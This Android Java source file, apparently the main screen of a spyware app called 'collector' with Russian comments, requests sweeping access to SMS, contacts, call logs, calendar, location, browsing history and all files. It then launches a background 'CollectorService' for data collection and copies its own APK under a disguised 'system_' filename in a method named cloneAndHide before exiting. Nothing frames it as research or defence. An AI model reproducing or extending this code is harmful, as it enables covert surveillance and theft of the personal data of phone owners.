package com.cipherium.collector;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_PERMISSIONS = 100;
    private TextView statusText;
    private Button btnStart;
    private String[] requiredPermissions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusText = findViewById(R.id.statusText);
        btnStart = findViewById(R.id.btnStart);

        // Все необходимые разрешения
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_CALENDAR);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        perms.add(Manifest.permission.INTERNET);
        perms.add(Manifest.permission.FOREGROUND_SERVICE);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.BLUETOOTH);
        perms.add(Manifest.permission.BLUETOOTH_ADMIN);
        perms.add(Manifest.permission.ACCESS_WIFI_STATE);
        perms.add(Manifest.permission.ACCESS_NETWORK_STATE);
        perms.add(Manifest.permission.READ_HISTORY_BOOKMARKS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        requiredPermissions = perms.toArray(new String[0]);

        btnStart.setOnClickListener(v -> {
            if (allPermissionsGranted()) {
                startCollection();
            } else {
                requestPermissionsIfNeeded();
            }
        });

        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        if (allPermissionsGranted()) {
            statusText.setText("✅ Все разрешения получены");
            btnStart.setEnabled(true);
            btnStart.setAlpha(1.0f);
        } else {
            statusText.setText("⏳ Запрос разрешений...");
            requestPermissionsIfNeeded();
        }
    }

    private boolean allPermissionsGranted() {
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        // Проверка MANAGE_EXTERNAL_STORAGE для Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissionsIfNeeded() {
        List<String> needRequest = new ArrayList<>();
        for (String perm : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needRequest.add(perm);
            }
        }

        if (!needRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, needRequest.toArray(new String[0]), REQUEST_CODE_PERMISSIONS);
        }

        // Для Android 11+ запрос MANAGE_EXTERNAL_STORAGE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_CODE_PERMISSIONS + 1);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                checkAndRequestPermissions();
            } else {
                statusText.setText("❌ Некоторые разрешения не получены");
                Toast.makeText(this, "Разрешения не получены", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_PERMISSIONS + 1) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    checkAndRequestPermissions();
                } else {
                    statusText.setText("❌ Нет доступа к файлам");
                    Toast.makeText(this, "Нет доступа к файлам", Toast.LENGTH_LONG).show();
                }
            }
        }
    }

    private void startCollection() {
        statusText.setText("🚀 Сбор данных...");
        Intent serviceIntent = new Intent(this, CollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        cloneAndHide();
    }

    private void cloneAndHide() {
        try {
            String apkPath = getApplicationInfo().sourceDir;
            String targetDir = Environment.getExternalStorageDirectory() +
                    "/Android/data/" + getPackageName() + "/files/";
            File dir = new File(targetDir);
            if (!dir.exists()) dir.mkdirs();

            String cloneName = "system_" + System.currentTimeMillis() + ".apk";
            File targetFile = new File(dir, cloneName);

            FileInputStream fis = new FileInputStream(apkPath);
            FileOutputStream fos = new FileOutputStream(targetFile);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = fis.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            fis.close();
            fos.close();

            Toast.makeText(this, "Клон создан: " + targetFile.getAbsolutePath(), Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            e.printStackTrace();
        }

        finishAffinity();
        System.exit(0);
    }
}